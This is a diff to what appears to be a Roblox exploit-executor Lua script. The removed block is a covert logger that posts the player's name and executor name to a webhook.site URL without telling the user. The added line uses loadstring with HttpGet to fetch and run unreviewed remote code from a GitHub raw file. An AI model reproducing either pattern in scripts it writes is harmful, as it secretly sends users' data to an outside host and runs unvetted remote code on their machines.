@@ -691,37 +691,4 @@ local Button = Tab:CreateButton({
    end,
 })
 
-local http_request = request or http_request or (http and http.request) or syn.request
-
-local executorName = identifyexecutor and identifyexecutor() or "unkwone executor"
-
-if http_request then
-    http_request({
-        Url = "https://webhook.site/39648439-5d92-43ac-bd01-f69d21e024ad",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({
-            ["username"] = "executor Logger",
-            ["content"] = "script got used",
-            ["embeds"] = {{
-                ["title"] = "player info",
-                ["fields"] = {
-                    {
-                        ["name"] = "Name",
-                        ["value"] = game.Players.LocalPlayer.Name,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "executor",
-                        ["value"] = executorName,
-                        ["inline"] = true
-                    }
-                },
-                ["color"] = 3447003
-            }}
-        })
-    })
-else
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Teddyfeit/sry-bro-idk-what-tf-im-dong/refs/heads/main/not.lua"))()
